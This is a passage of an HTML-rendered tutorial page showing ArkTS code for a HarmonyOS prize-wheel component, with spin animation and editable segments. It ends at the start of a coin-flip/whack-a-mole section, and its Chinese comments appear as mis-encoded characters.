class_">Wheel</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cells</span>: <span class="title class_">Cell</span>[] = []; <span class="comment">// å­˜å‚¨å•å…ƒæ ¼çš„æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">wheelWidth</span>: number = <span class="number">600</span>; <span class="comment">// è½¬ç›˜çš„å®½åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentAngle</span>: number = <span class="number">0</span>; <span class="comment">// å½“å‰è½¬ç›˜çš„è§’åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedName</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// é€‰ä¸­çš„åç§°</span></span><br><span class="line">  <span class="attr">isAnimating</span>: boolean = <span class="literal">false</span>; <span class="comment">// åŠ¨ç”»çŠ¶æ€</span></span><br><span class="line">  <span class="attr">colorIndex</span>: number = <span class="number">0</span>; <span class="comment">// é¢œè‰²ç´¢å¼•</span></span><br><span class="line">  <span class="attr">colorPalette</span>: string[] = [ <span class="comment">// é¢œè‰²è°ƒè‰²æ¿</span></span><br><span class="line">    <span class="string">&quot;#26c2ff&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#978efe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#c389fe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#ff85bd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#ff7051&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#fea800&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#ffcf18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#a9c92a&quot;</span></span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç»„ä»¶å³å°†å‡ºç°æ—¶è°ƒç”¨</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–å•å…ƒæ ¼</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>, <span class="string">&quot;è·‘æ­¥&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>, <span class="string">&quot;è·³ç»³&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>, <span class="string">&quot;å”±æ­Œ&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">4</span>, <span class="string">&quot;è·³èˆ&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// è®¡ç®—è§’åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// è®¡ç®—æ¯ä¸ªå•å…ƒæ ¼çš„è§’åº¦</span></span><br><span class="line">  private <span class="title function_">calculateAngles</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// æ ¹æ®æ¯”ä¾‹è®¡ç®—æ€»æ¯”ä¾‹</span></span><br><span class="line">    <span class="keyword">const</span> totalProportion = <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, cell</span>) =&gt;</span> sum + cell.<span class="property">proportion</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cell</span> =&gt;</span> &#123;</span><br><span class="line">      cell.<span class="property">angle</span> = (cell.<span class="property">proportion</span> * <span class="number">360</span>) / totalProportion; <span class="comment">// è®¡ç®—æ¯ä¸ªå•å…ƒæ ¼çš„è§’åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> cumulativeAngle = <span class="number">0</span>; <span class="comment">// ç´¯è®¡è§’åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cell</span> =&gt;</span> &#123;</span><br><span class="line">      cell.<span class="property">angleStart</span> = cumulativeAngle; <span class="comment">// è®¾ç½®èµ·å§‹è§’åº¦</span></span><br><span class="line">      cumulativeAngle += cell.<span class="property">angle</span>; <span class="comment">// æ›´æ–°ç´¯è®¡è§’åº¦</span></span><br><span class="line">      cell.<span class="property">angleEnd</span> = cumulativeAngle; <span class="comment">// è®¾ç½®ç»“æŸè§’åº¦</span></span><br><span class="line">      cell.<span class="property">rotate</span> = cumulativeAngle - (cell.<span class="property">angle</span> / <span class="number">2</span>); <span class="comment">// è®¡ç®—æ—‹è½¬è§’åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºè½¬ç›˜ç»„ä»¶</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;è½¬ç›˜&#x27;</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontColor</span>(<span class="string">&quot;#0b0e15&quot;</span>); <span class="comment">// æ˜¾ç¤ºè½¬ç›˜æ ‡é¢˜</span></span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="number">44</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>); <span class="comment">// è®¾ç½®è¡Œçš„å®½åº¦å’Œé«˜åº¦</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºå½“å‰çŠ¶æ€</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">isAnimating</span> ? <span class="string">&#x27;æ—‹è½¬ä¸­&#x27;</span> : <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.selectedName&#125;</span>`</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontColor</span>(<span class="string">&quot;#0b0e15&quot;</span>).<span class="title function_">height</span>(<span class="number">40</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="comment">// éå†æ¯ä¸ªå•å…ƒæ ¼å¹¶ç»˜åˆ¶æ‰‡å½¢</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">cells</span>, <span class="function">(<span class="params">cell: Cell</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Stack</span>() &#123;</span><br><span class="line">              <span class="title class_">Sector</span>(&#123; <span class="attr">radius</span>: <span class="title function_">lpx2px</span>(<span class="variable language_">this</span>.<span class="property">wheelWidth</span>) / <span class="number">2</span>, <span class="attr">angle</span>: cell.<span class="property">angle</span>, <span class="attr">color</span>: cell.<span class="property">color</span> &#125;); <span class="comment">// åˆ›å»ºæ‰‡å½¢</span></span><br><span class="line">              <span class="title class_">Text</span>(cell.<span class="property">title</span>).<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>).<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.wheelWidth / <span class="number">1.4</span>&#125;</span>lpx`</span> &#125;); <span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼æ ‡é¢˜</span></span><br><span class="line">            &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: cell.<span class="property">rotate</span> &#125;); <span class="comment">// è®¾ç½®å®½åº¦å’Œé«˜åº¦ï¼Œå¹¶æ—‹è½¬</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Gray</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.wheelWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®è½¬ç›˜å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.wheelWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®è½¬ç›˜é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">currentAngle</span> &#125;); <span class="comment">// æ—‹è½¬è½¬ç›˜</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆ›å»ºæŒ‡é’ˆ</span></span><br><span class="line">        <span class="title class_">Polygon</span>(&#123; <span class="attr">width</span>: <span class="number">20</span>, <span class="attr">height</span>: <span class="number">10</span> &#125;)</span><br><span class="line">          .<span class="title function_">points</span>([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">10</span>, -<span class="number">20</span>], [<span class="number">20</span>, <span class="number">0</span>]]) <span class="comment">// è®¾ç½®æŒ‡é’ˆçš„ç‚¹</span></span><br><span class="line">          .<span class="title function_">fill</span>(<span class="string">&quot;#d72b0b&quot;</span>) <span class="comment">// è®¾ç½®æŒ‡é’ˆé¢œè‰²</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">20</span>) <span class="comment">// è®¾ç½®æŒ‡é’ˆé«˜åº¦</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">&#x27;140lpx&#x27;</span> &#125;); <span class="comment">// è®¾ç½®æŒ‡é’ˆåº•éƒ¨è¾¹è·</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆ›å»ºå¼€å§‹æŒ‰é’®</span></span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;å¼€å§‹&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&quot;#c53a2c&quot;</span>) <span class="comment">// è®¾ç½®æŒ‰é’®å­—ä½“é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">borderWidth</span>(<span class="number">10</span>) <span class="comment">// è®¾ç½®æŒ‰é’®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">          .<span class="title function_">borderColor</span>(<span class="string">&quot;#dd2218&quot;</span>) <span class="comment">// è®¾ç½®æŒ‰é’®è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#fde427&quot;</span>) <span class="comment">// è®¾ç½®æŒ‰é’®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;200lpx&#x27;</span>) <span class="comment">// è®¾ç½®æŒ‰é’®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;200lpx&#x27;</span>) <span class="comment">// è®¾ç½®æŒ‰é’®é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®æŒ‰é’®ä¸ºåœ†å½¢</span></span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span> &#125;) <span class="comment">// è®¾ç½®ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»æŒ‰é’®æ—¶çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimating</span>) &#123; <span class="comment">// å¦‚æœæ­£åœ¨åŠ¨ç”»ä¸­ï¼Œè¿”å›</span></span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedName</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// æ¸…ç©ºé€‰ä¸­çš„åç§°</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºæ­£åœ¨åŠ¨ç”»</span></span><br><span class="line">            <span class="title function_">animateTo</span>(&#123; <span class="comment">// å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">              <span class="attr">duration</span>: <span class="number">5000</span>, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´ä¸º5000æ¯«ç§’</span></span><br><span class="line">              <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseInOut</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ä¸ºç¼“å…¥ç¼“å‡º</span></span><br><span class="line">              <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">currentAngle</span> %= <span class="number">360</span>; <span class="comment">// ä¿æŒå½“å‰è§’åº¦åœ¨0åˆ°360ä¹‹é—´</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">const</span> cell <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">cells</span>) &#123; <span class="comment">// éå†æ¯ä¸ªå•å…ƒæ ¼</span></span><br><span class="line">                  <span class="comment">// æ£€æŸ¥å½“å‰è§’åº¦æ˜¯å¦åœ¨å•å…ƒæ ¼çš„è§’åº¦èŒƒå›´å†…</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="number">360</span> - <span class="variable language_">this</span>.<span class="property">currentAngle</span> &gt;= cell.<span class="property">angleStart</span> &amp;&amp; <span class="number">360</span> - <span class="variable language_">this</span>.<span class="property">currentAngle</span> &lt;= cell.<span class="property">angleEnd</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedName</span> = cell.<span class="property">title</span>; <span class="comment">// è®¾ç½®é€‰ä¸­çš„åç§°ä¸ºå½“å‰å•å…ƒæ ¼çš„æ ‡é¢˜</span></span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">// æ‰¾åˆ°åé€€å‡ºå¾ªç¯</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºæœªåŠ¨ç”»</span></span><br><span class="line">              &#125;,</span><br><span class="line">            &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»è¿›è¡Œä¸­çš„å›è°ƒ</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">currentAngle</span> += (<span class="number">360</span> * <span class="number">5</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">360</span>)); <span class="comment">// æ›´æ–°å½“å‰è§’åº¦ï¼Œå¢åŠ éšæœºæ—‹è½¬</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// åˆ›å»ºæ»šåŠ¨åŒºåŸŸ</span></span><br><span class="line">      <span class="title class_">Scroll</span>() &#123;</span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// éå†æ¯ä¸ªå•å…ƒæ ¼ï¼Œåˆ›å»ºè¾“å…¥æ¡†å’Œè®¡æ•°å™¨</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">cells</span>, <span class="function">(<span class="params">item: Cell, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="comment">// åˆ›å»ºæ–‡æœ¬è¾“å…¥æ¡†ï¼Œæ˜¾ç¤ºå•å…ƒæ ¼æ ‡é¢˜</span></span><br><span class="line">              <span class="title class_">TextInput</span>(&#123; <span class="attr">text</span>: item.<span class="property">title</span> &#125;)</span><br><span class="line">                .<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// è®¾ç½®è¾“å…¥æ¡†å æ®å‰©ä½™ç©ºé—´</span></span><br><span class="line">                .<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// è¾“å…¥æ¡†å†…å®¹å˜åŒ–æ—¶çš„å›è°ƒ</span></span><br><span class="line">                  item.<span class="property">title</span> = value; <span class="comment">// æ›´æ–°å•å…ƒæ ¼æ ‡é¢˜</span></span><br><span class="line">                &#125;);</span><br><span class="line">              <span class="comment">// åˆ›å»ºè®¡æ•°å™¨ç»„ä»¶</span></span><br><span class="line">              <span class="title class_">CounterComponent</span>(&#123;</span><br><span class="line">                <span class="attr">options</span>: &#123;</span><br><span class="line">                  <span class="attr">type</span>: <span class="title class_">CounterType</span>.<span class="property">COMPACT</span>, <span class="comment">// è®¾ç½®è®¡æ•°å™¨ç±»å‹ä¸ºç´§å‡‘å‹</span></span><br><span class="line">                  <span class="attr">numberOptions</span>: &#123;</span><br><span class="line">                    <span class="attr">label</span>: <span class="string">`å½“å‰å æ¯”`</span>, <span class="comment">// è®¾ç½®è®¡æ•°å™¨æ ‡ç­¾</span></span><br><span class="line">                    <span class="attr">value</span>: item.<span class="property">proportion</span>, <span class="comment">// è®¾ç½®è®¡æ•°å™¨åˆå§‹å€¼</span></span><br><span class="line">                    <span class="attr">min</span>: <span class="number">1</span>, <span class="comment">// è®¾ç½®æœ€å°å€¼</span></span><br><span class="line">                    <span class="attr">max</span>: <span class="number">100</span>, <span class="comment">// è®¾ç½®æœ€å¤§å€¼</span></span><br><span class="line">                    <span class="attr">step</span>: <span class="number">1</span>, <span class="comment">// è®¾ç½®æ­¥é•¿</span></span><br><span class="line">                    <span class="attr">onChange</span>: <span class="function">(<span class="params">value: number</span>) =&gt;</span> &#123; <span class="comment">// è®¡æ•°å™¨å€¼å˜åŒ–æ—¶çš„å›è°ƒ</span></span><br><span class="line">                      item.<span class="property">proportion</span> = value; <span class="comment">// æ›´æ–°å•å…ƒæ ¼çš„æ¯”ä¾‹</span></span><br><span class="line">                      <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// é‡æ–°è®¡ç®—è§’åº¦</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="comment">// åˆ›å»ºåˆ é™¤æŒ‰é’®</span></span><br><span class="line">              <span class="title class_">Button</span>(<span class="string">&#x27;åˆ é™¤&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">splice</span>(index, <span class="number">1</span>); <span class="comment">// ä»å•å…ƒæ ¼æ•°ç»„ä¸­åˆ é™¤å½“å‰å•å…ƒæ ¼</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// é‡æ–°è®¡ç®—è§’åº¦</span></span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// è®¾ç½®è¡Œçš„å®½åº¦å’Œå†…å®¹å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">40</span>, <span class="attr">right</span>: <span class="number">40</span> &#125;); <span class="comment">// è®¾ç½®å·¦å³å†…è¾¹è·</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;.<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// è®¾ç½®æ»šåŠ¨åŒºåŸŸå æ®å‰©ä½™ç©ºé—´</span></span><br><span class="line">      &#125;.<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// è®¾ç½®æ»šåŠ¨åŒºåŸŸå æ®å‰©ä½™ç©ºé—´</span></span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span>, <span class="attr">bottom</span>: <span class="number">20</span> &#125;) <span class="comment">// è®¾ç½®ä¸Šä¸‹å¤–è¾¹è·</span></span><br><span class="line">      .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>); <span class="comment">// è®¾ç½®å¯¹é½æ–¹å¼ä¸ºé¡¶éƒ¨å¯¹é½</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// åˆ›å»ºæ·»åŠ æ–°å†…å®¹æŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;æ·»åŠ æ–°å†…å®¹&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// å‘å•å…ƒæ ¼æ•°ç»„ä¸­æ·»åŠ æ–°å•å…ƒæ ¼</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>, <span class="string">&quot;æ–°å†…å®¹&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// é‡æ–°è®¡ç®—è§’åº¦</span></span><br><span class="line">      &#125;).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span>, <span class="attr">bottom</span>: <span class="number">20</span> &#125;); <span class="comment">// è®¾ç½®æŒ‰é’®çš„ä¸Šä¸‹å¤–è¾¹è·</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®ç»„ä»¶é«˜åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®ç»„ä»¶å®½åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f5f8ff&quot;</span>); <span class="comment">// è®¾ç½®ç»„ä»¶èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Coin"><a href="#Coin" class="headerlink" title="Coin"></a>Coin</h1><p>æŠ•ç¡¬å¸</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰åœ°é¼ ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Hamster</span> &#123;</span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">cellWidth</span>: number <span class="comment">// å•å…ƒæ 